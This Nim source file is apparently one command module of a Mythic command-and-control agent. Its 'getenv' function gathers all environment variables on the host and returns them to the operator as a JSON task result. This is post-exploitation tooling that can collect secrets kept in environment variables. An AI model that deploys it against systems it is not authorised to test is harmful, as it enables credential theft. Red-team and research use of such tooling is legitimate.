import ../config
import ../utils/mythic_responses
import std/[json, os, strformat]

proc getenv*(taskId: string, params: JsonNode): JsonNode =
  ## Get all environment variables
  let cfg = getConfig()
  
  try:
    if cfg.debug:
      echo "[DEBUG] GetEnv: Getting all environment variables"
    
    var envList = newJArray()
    
    # Iterate over all environment variables
    for key, value in envPairs():
      var envPair = %*{
        "key": key,
        "value": value
      }
      envList.add(envPair)
    
    if cfg.debug:
      echo "[DEBUG] GetEnv: Found ", envList.len, " environment variables"
    
    # Convert to string for output
    let output = $envList
    
    return mythicSuccess(taskId, output)
    
  except Exception as e:
    return mythicError(taskId, &"GetEnv error: {e.msg}")
